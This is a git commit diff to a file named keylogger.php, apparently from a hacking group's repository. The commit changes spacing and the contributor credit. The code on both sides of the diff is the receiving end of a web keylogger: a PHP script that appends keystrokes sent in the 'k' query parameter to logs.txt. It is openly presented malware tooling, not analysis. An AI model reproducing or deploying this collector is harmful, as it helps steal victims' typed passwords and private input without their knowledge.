471c457c54ff18ad89aaec8f1389ce950d3d4565
Anonymous Security Hackers <lulzsec780@gmail.com>
2017-08-13 08:27:18 +0800

    Update keylogger.php

--- src/keylogger.php
+++ src/keylogger.php
@@ -1,9 +1,9 @@
-// Contributed by SilentX Philippines
+// Contributed by Kh
 // (c)opyright - Anonymous Security Hackers
 
 <?php
- $key=$_GET['k'];
- $f=fopen("logs.txt","a");
- fwrite($f,$key);
- fclose($f);
+ $key=$_GET[ 'k' ];
+ $f=fopen( "logs.txt", "a" );
+ fwrite( $f, $key );
+ fclose( $f );
 ?>
